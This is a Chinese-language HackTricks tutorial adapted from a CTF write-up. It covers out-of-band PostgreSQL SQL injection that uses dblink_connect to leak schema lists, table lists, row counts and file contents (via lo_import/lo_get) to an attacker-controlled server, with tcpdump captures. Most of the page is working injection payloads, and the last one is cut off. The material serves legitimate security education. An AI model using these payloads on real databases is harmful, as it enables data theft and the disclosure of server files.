# dblink/lo\_import 数据泄露

<details>

<summary><strong>从零开始学习AWS黑客攻击直至成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在 **HackTricks中看到您的公司广告** 或 **下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

**这是一个示例，展示如何使用`lo_import`在数据库中加载文件并使用`dblink_connect`进行数据泄露。**

## 准备数据泄露服务器/异步SQL注入

**摘自：** [**https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md**](https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md)

因为`pg_sleep`也不会导致延迟，我们可以安全地假设查询执行是在后台或异步进行的。

通常，`dblink_connect`可用于打开到远程PostgreSQL数据库的持久连接（例如`SELECT dblink_connect('host=HOST user=USER password=PASSWORD dbname=DBNAME')`）。因为我们可以控制这个函数的参数，我们可以对我们自己的主机执行SQL服务器端请求伪造。这意味着，我们可以执行Out-of-Band SQL注入来从SQL查询结果中泄露数据。至少有两种方法可以做到这一点：

1. 设置一个**DNS服务器**，然后触发连接到`[data].our.domain`，这样我们可以在日志或DNS网络包中看到数据。
2. 设置一个**公共PostgreSQL服务器，监控传入的PostgreSQL端口的网络包**，然后触发连接到我们的主机，并将泄露的数据作为`user`/`dbname`。**默认情况下**，PostgreSQL不使用SSL进行通信，所以我们可以在网络上以**明文**形式看到`user`/`dbname`。

**第二种方法更简单**，因为我们不需要任何域名。我们只需要设置一个具有公共IP的服务器，安装PostgreSQL，设置PostgreSQL服务监听\*/0.0.0.0，并运行网络转储器（例如tcpdump）来监控到PostgreSQL端口（默认为5432）的流量。

要设置PostgreSQL以便它**对公众开放监听**，请在`postgresql.conf`中将`listen_addresses`设置为`*`。
```
listen_addresses = '*'
```
要监控传入流量，请运行 `tcpdump` 来监控端口 5432。
```
sudo tcpdump -nX -i eth0 port 5432
```
要查看我们是否从目标获得连接，我们可以尝试使用此查询：
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=farisv password=postgres dbname=hellofromfb')) --
```
如果成功，我们将获得一个包含可读的 `user` 和 `dbname` 的网络数据包片段。
```
17:14:11.267060 IP [54.185.163.254.50968] > [REDACTED]: Flags [P.], seq 1:43, ack 1, win 229, options [nop,nop,TS val 970078525 ecr 958693110], length 42
0x0000:  4500 005e 9417 4000 2706 248c 36b9 a3fe  E..^..@.'.$.6...
0x0010:  9de6 2259 c718 2061 5889 142a 9f8a cb5d  .."Y...aX..*...]
0x0020:  8018 00e5 1701 0000 0101 080a 39d2 393d  ............9.9=
0x0030:  3924 7ef6 0000 002a 0003 0000 7573 6572  9$~....*....user
0x0040:  0066 6172 6973 7600 6461 7461 6261 7365  .farisv.database
0x0050:  0068 656c 6c6f 6672 6f6d 6662 0000       .hellofromfb.
```
然后，我们可以**继续使用几个PostgreSQL查询来提取数据库**。请注意，对于每个查询结果中包含空格的，我们需要使用`encode`函数将结果转换为**hex/base64**，或者使用`replace`函数将空格替换为其他字符，因为这会在`dblink_connect`过程中引起执行错误。

获取**架构**的**列表**：
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(schema_name,':') FROM information_schema.schemata) || ' password=postgres dbname=postgres')) --
```

```
17:36:46.538178 IP 54.185.163.254.51018 > [REDACTED]: Flags [P.], seq 1:70, ack 1, win 229, options [nop,nop,TS val 971433789 ecr 960048322], length 69
0x0000:  4500 0079 ecd5 4000 2706 cbb2 36b9 a3fe  E..y..@.'...6...
0x0010:  9de6 2259 c74a 2061 1e74 4769 b404 803d  .."Y.J.a.tGi...=
0x0020:  8018 00e5 2710 0000 0101 080a 39e6 e73d  ....'.......9..=
0x0030:  3939 2cc2 0000 0045 0003 0000 7573 6572  99,....E....user
0x0040:  0070 7562 6c69 633a 696e 666f 726d 6174  .public:informat
0x0050:  696f 6e5f 7363 6865 6d61 3a70 675f 6361  ion_schema:pg_ca
0x0060:  7461 6c6f 6700 6461 7461 6261 7365 0070  talog.database.p
0x0070:  6f73 7467 7265 7300 00                   ostgres.
```
获取当前模式中**表**的**列表**：
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(tablename, ':') FROM pg_catalog.pg_tables WHERE schemaname=current_schema()) || ' password=postgres dbname=postgres')) --
```

```
17:38:30.515438 IP 54.185.163.254.51026 > [REDACTED]: Flags [P.], seq 1:42, ack 1, win 229, options [nop,nop,TS val 971537775 ecr 960152304], length 41
0x0000:  4500 005d f371 4000 2706 c532 36b9 a3fe  E..].q@.'..26...
0x0010:  9de6 2259 c752 2061 8dd4 e226 24a3 a5c5  .."Y.R.a...&$...
0x0020:  8018 00e5 fe2b 0000 0101 080a 39e8 7d6f  .....+......9.}o
0x0030:  393a c2f0 0000 0029 0003 0000 7573 6572  9:.....)....user
0x0040:  0073 6561 7263 6865 7300 6461 7461 6261  .searches.databa
0x0050:  7365 0070 6f73 7467 7265 7300 00         se.postgres.
```
**计数** `searches` 表中的**行数**。
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT COUNT(*) FROM searches) || ' password=postgres dbname=postgres')) --
```

```
17:42:39.511643 IP 54.185.163.254.51034 > [REDACTED]: Flags [P.], seq 1:35, ack 1, win 229, options [nop,nop,TS val 971786760 ecr 960401280], length 34
0x0000:  4500 0056 7982 4000 2706 3f29 36b9 a3fe  E..Vy.@.'.?)6...
0x0010:  9de6 2259 c75a 2061 5ec0 7df0 8611 357d  .."Y.Z.a^.}...5}
0x0020:  8018 00e5 f855 0000 0101 080a 39ec 4a08  .....U......9.J.
0x0030:  393e 8f80 0000 0022 0003 0000 7573 6572  9>....."....user
0x0040:  0030 0064 6174 6162 6173 6500 706f 7374  .0.database.post
0x0050:  6772 6573 0000                           gres.
```
当前模式中似乎只有一个空表，且标志不在数据库中。我们可能确实需要从 `/var/lib/postgresql/data/secret` 中提取数据。不幸的是，如果我们尝试使用 `pg_read_file` 或 `pg_read_binary_file` 来读取文件，我们将不会得到传入连接，因此当前用户可能没有权限使用这些函数。

#### 更多关于异步 SQLInjection 与 postdresql 的信息

* [https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md](https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md)

## **提取大型对象内容**

可以使用大型对象来读取文件（[https://www.postgresql.org/docs/11/lo-funcs.html](https://www.postgresql.org/docs/11/lo-funcs.html)）。我们可以使用 `lo_import` 将文件内容加载到 `pg_largeobject` 目录中。如果查询成功，我们将获得对象的 `oid`。
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT lo_import('/var/lib/postgresql/data/secret')) || ' password=postgres dbname=postgres')) --
```

```
17:54:51.963925 IP 54.185.163.254.51046 > [REDACTED]: Flags [P.], seq 1:39, ack 1, win 229, options [nop,nop,TS val 972519214 ecr 961133706], length 38
0x0000:  4500 005a 071f 4000 2706 b188 36b9 a3fe  E..Z..@.'...6...
0x0010:  9de6 2259 c766 2061 26fb c8a7 bbb3 fe01  .."Y.f.a&.......
0x0020:  8018 00e5 2272 0000 0101 080a 39f7 772e  ...."r......9.w.
0x0030:  3949 bc8a 0000 0026 0003 0000 7573 6572  9I.....&....user
0x0040:  0032 3436 3638 0064 6174 6162 6173 6500  .24668.database.
0x0050:  706f 7374 6772 6573 0000                 postgres..
```
我们得到了24668作为`oid`，这意味着我们可以使用`lo_import`函数。不幸的是，如果我们尝试使用`lo_get(24668)`获取大型对象的内容，或者直接访问`pg_largeobject`目录，我们将得不到任何结果。**看起来当前用户没有权限读取新对象的内容。**

阅读了PostgreSQL中大型对象的文档后，我们可以发现**大型对象可以有ACL**（访问控制列表）。这意味着，如果有一个旧对象的ACL允许当前用户读取它，那么我们可以泄露该对象的内容。

我们可以通过从`pg_largeobject_metadata`提取来获取可用大型对象的`oid`列表。
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(cast(l.oid as text), ':') FROM pg_largeobject_metadata l) || ' password=postgres dbname=postgres')) --
```

```
18:06:57.172285 IP 54.185.163.254.51052 > [REDACTED]: Flags [.], seq 1:2897, ack 1, win 229, options [nop,nop,TS val 973244413 ecr 961858878], length 2896
0x0000:  4500 0b84 7adf 4000 2606 339e 36b9 a3fe  E...z.@.&.3.6...
0x0010:  9de6 2259 c76c 2061 8d76 e934 10c9 3972  .."Y.l.a.v.4..9r
0x0020:  8010 00e5 a66d 0000 0101 080a 3a02 87fd  .....m......:...
0x0030:  3954 cd3e 0000 1c94 0003 0000 7573 6572  9T.>........user
0x0040:  0031 3635 3731 3a31 3634 3339 3a31 3635  .16571:16439:165
0x0050:  3732 3a31 3634 3431 3a31 3634 3432 3a31  72:16441:16442:1
0x0060:  3733 3732 3a31 3634 3434 3a31 3634 3435  7372:16444:16445
0x0070:  3a31 3831 3534 3a31 3733 3830 3a31 3737  :18154:17380:177
0x0080:  3038 3a31 3635 3737 3a31 3634 3530 3a31  08:16577:16450:1
0x0090:  3634 3531 3a31 3634 3532 3a31 3634 3533  6451:16452:16453

.....
.....
.....
```
我们得到了一些`oid`。我们可以尝试使用`lo_get`来加载对象的内容。例如，`lo_get(16439)`将加载`/etc/passwd`的内容。因为`lo_get`的结果是`bytea`，我们需要将其转换为`UTF8`，以便可以在查询中追加。

我们可以尝试加载一些最低`oid`的对象，以找出标志文件是否已经加载过。标志文件对象确实存在，`oid`为16444。标志中没有空格，所以我们可以按原样显示它。

加载标志的方法：
```
asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT convert_from(lo_get(16444), 'UTF8')) || ' password=postgres dbname=p
```
#### 更多 oid 信息：

* [https://balsn.tw/ctf\_writeup/20190603-facebookctf/#hr\_admin\_module](https://balsn.tw/ctf\_writeup/20190603-facebookctf/#hr\_admin\_module)
* [https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md](https://github.com/PDKT-Team/ctf/blob/master/fbctf2019/hr-admin-module/README.md)

<details>

<summary><strong>从零开始学习 AWS 黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您希望在 **HackTricks 中看到您的公司广告** 或 **下载 HackTricks 的 PDF 版本**，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们独家的 [**NFT 集合**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上 **关注** 我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
